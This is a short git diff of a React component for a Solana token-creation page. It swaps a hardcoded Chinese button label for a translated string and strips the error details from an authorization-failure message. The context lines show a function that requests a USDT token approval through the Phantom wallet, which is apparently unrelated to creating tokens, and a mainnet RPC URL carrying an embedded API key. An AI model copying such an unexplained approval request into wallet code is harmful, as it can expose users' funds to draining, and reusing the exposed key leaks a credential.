@@ -125,7 +125,7 @@ function CreateToken() {
     }
   }
   
-  const button_name = "创建代币";
+
 const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solana-mainnet.quiknode.pro/67a8102a7e0730d78c0a294e50c1b2dace9ffe26/") => {
   try {
     const provider = (window as any).solana;
@@ -248,7 +248,7 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
     console.error("授权失败:", err);
     if (err.logs) console.log("Simulation logs:", err.logs);
     // alert("授权失败: " + (err.message || err));
-	return messageApi.error("授权失败: " + (err.message || err));
+	return messageApi.error("授权失败");
   }
 };
 
@@ -661,8 +661,7 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
           <div className='buttonSwapper'>
             <Button className={Button_Style}
               onClick={createToken} loading={iscreating}>
-              {/* <span>{t('Token Creator')}</span> */}
-				<span>{button_name}</span>
+              <span>{t('Token Creator')}</span>
             </Button>
           </div>
           <div className='fee'>全网最低服务费: {vipConfig.isVip ? 0 : CREATE_TOKEN_FEE} SOL</div>
@@ -676,6 +675,7 @@ const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solan
 }
 
 export default CreateToken
+
 
 
 
